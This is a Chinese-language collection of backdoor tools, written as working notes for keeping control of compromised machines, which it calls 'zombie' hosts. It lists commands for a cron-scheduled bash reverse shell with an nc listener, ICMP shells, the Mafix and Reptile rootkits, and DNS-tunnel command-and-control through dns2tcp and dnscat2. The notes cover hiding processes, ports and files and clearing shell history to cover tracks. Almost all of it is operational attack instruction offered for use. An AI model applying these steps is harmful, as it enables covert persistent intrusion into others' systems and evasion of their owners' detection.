# backdoor工具收藏

****************************************************
1、 Bash TCP反弹后门<br>
bash_tcp_backdoor.sh<br>
vim /etc/crontab<br>
*/1 * * * * root /root/ok.sh<br>
或<br>
crontab -e<br>
*/1 * * * *  /root/ok.sh<br>
systemctl restart crond<br>
控制机执行<br>
nc -l -v -p 5353

****************************************************
2、icmp shell无端口后门<br>
原文：https://www.cnblogs.com/bravexz/p/9761411.html<br>
wget http://prdownloads.sourceforge.net/icmpshell/ish-v0.2.tar.gz<br>
tar -zxvf ish-v0.2.tar.gz<br>
cd ISHELL-v0.2/<br>
make && make linux<br>
make linux<br>
肉鸡192.168.1.28上执行命令：<br>
./ishd -i 555 -t 0 -p 1099 &<br>
控制机执行：<br>
./ish -i 555 -t 0 -p 1099 192.168.1.28<br>
命令解释：<br>
-i 指定ID，标识自己的请求<br>
-t 指定icmp数据的类型 <br>
-p 指定 icmp 数据 包大小 ,一般 情况下 1024 即可<br>

****************************************************
3、icmpsh后门<br>
pip install impacket<br>
git clone https://github.com/inquisb/icmpsh.git<br>
cd icmpsh<br>
./run.sh<br>
控制端运行：<br>
python icmpsh_m.py 192.168.1.28 192.168.1.41<br>
#./icmpsh-m.py <控制机IP> <肉鸡IP><br>
sz icmpsh.exe到本地<br>
C:\>icmpsh.exe -t 192.168.1.28 -d 600 -b 20 -s 256   //指向控制机<br>

https://blog.csdn.net/Fly_hps/article/details/80627628<br>
https://www.jianshu.com/p/3bdf8c5557e8<br>
https://www.cnblogs.com/bravexz/p/9761411.html<br>
https://github.com/sevck/icmp_Tunnel<br>
https://blog.csdn.net/qq_33020901/article/details/81773737<br>

****************************************************
4、mafix.tar.gz  rootkit后门<br>
Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现让攻击者远程登陆的，特点是配置简单并可以自定义验证密码和端口号。
kali 下测试通过，centos7不兼容<br>
wget https://github.com/synjkc/backdoor/blob/master/mafix.tar.gz<br>
tar -zxvf mafix.tar.gz<br>
cd mafix<br>
./root xiaoma 9999<br>

安装rootkit 命令：./root 密码  端口   (如: ./root xiaoma 9999  接着用ssh连接它的9999端口，用户名是root，密码为xiaoma)
安装完成后会自动删除目录，为了隐蔽，用 history -c 清除下命令就行了<br>
控制端执行： ssh ip -p9999

*******************************************************************<br>
5、Reptile Linux rootkit后门<br>
肉鸡上安装：<br>
git clone https://github.com/f0rb1dd3n/Reptile.git<br>
cd Reptile<br>
./setup.sh install<br>
卸载<br>
./setup.sh remove<br>
隐藏进程: /reptile/reptile_cmd hide <pid> <br>
显示进程: /reptile/reptile_cmd show <pid><br>
隐藏udp: /reptile/reptile_cmd udp <IP> <port> hide <br>
显示udp: /reptile/reptile_cmd udp <IP> <port> show<br>
隐藏tcp: /reptile/reptile_cmd tcp <IP> <port> hide <br>
显示tcp: /reptile/reptile_cmd tcp <IP> <port> show<br>
还可以隐藏文件 所有包含 reptile 这个字符的文件会被隐藏，这个字符可以在配置文件中修改。<br><br>

Kali上安装控制端<br>
./setup.sh client<br>
项目地址：https://github.com/f0rb1dd3n/Reptile<br>
https://carlstar.club/2019/04/09/rep/#on-vulnerable-ubuntu-192-168-5-148<br>
https://3hack.com/tools/85.html<br>
*******************************************************************<br>
6、服务端Kali 192.168.1.28,自带dns2tcp工具<br>
设置A记录 dns28.xxx.com到Kail<br>
服务端设置<br>
cat /etc/dns2tcpd.conf<br>
listen = 0.0.0.0<br>
port = 53<br>
user = nobody<br>
chroot = /tmp<br>
domain = dns28.xxx.com<br>
resources = c2:127.0.0.1:5353 , ssh:127.0.0.1:22 , smtp:127.0.0.1:25<br>
服务端运行：root@kali:~# dns2tcpd -f /etc/dns2tcpd.conf -F -d 1<br>
https://github.com/synjkc/backdoor/blob/master/dns2tcpc_client_win.zip<br>
客户端运行：<br>
dns2tcpc -r ssh -z dns28.xxx.com 192.168.1.28 -l 8888 -d 2<br>
本地win10运行[c:\~]$ ssh 127.0.0.1 2222，即可连接到Kali<br>
参考https://blog.csdn.net/gsls200808/article/details/50318947<br>
https://www.freebuf.com/articles/network/208242.html<br>
https://www.cnblogs.com/bonelee/p/7927706.html<br>
*******************************************************************<br>
7、DNS隧道工具 dnscat2<br>
a 安装<br>
服务端 <br>
debian9安装ruby环境: apt-get install ruby-full <br>
git clone https://github.com/iagox86/dnscat2.git <br>
cd dnscat2 <br>
cd server <br>
gem install bundler <br>
bundle install <br>
客户端 <br>
git clone https://github.com/iagox86/dnscat2.git <br>
cd dnscat2/client/<br> 
make<br><br>

b 使用 <br>
在服务端机器上，执行： <br>
root@kali:/opt/dnscat2/server# <br>
ruby dnscat2.rb //可以不带任何参数执行 <br>
ruby dnscat2.rb –dns “domain=dns.xxx.com,host=192.168.1.28,port=5353” –no-cache <br>
在客户端机器上，执行： <br>
[root@centos7vm client]# <br>
./dnscat –dns server=192.168.1.28,port=5353 –secret=xxx  //服务端会回显密钥<br><br>

c 进一步操作 <br>
可以用”sessions”命令来查看已经创建的会话 <br>
进入建立的session并与其交互：<br> 
dnscat2> session -i 1<br>

输入”shell”命令即可，它就会开启一个新的窗口，进入到目标系统的shell中 <br>
command (centos7vm) 1> shell<br>

与新的终端中打开的shell会话中进行交互，输入下面这两条命令： <br>
command (centos7vm) 1> windows <br>
command (centos7vm) 1> session -i 2 <br>
sh (centos7vm) 2> uname -a <br>
sh (centos7vm) 2> Linux centos7vm<br>

建立DNS隧道转发 <br>
dnscat2> session -i 1 <br>
command (centos7vm) 1> listen 127.0.0.1:1188 192.168.1.28:10022<br>

Usage: listen [:] : //kali地址及端口 肉鸡IP及端口<br>

Kali上用SSH登录肉鸡，在Kali上连接本地1188，将转发至肉鸡10022端口 <br>
root@kali:~#ssh root@127.0.0.1 -p 1188 <br>
参考：https://blog.csdn.net/localhost01/article/details/86591685 <br>
https://blog.csdn.net/ddr12231/article/details/102306989 <br>
https://blog.csdn.net/weixin_30389003/article/details/94863001 <br>
https://www.4hou.com/tools/17226.html
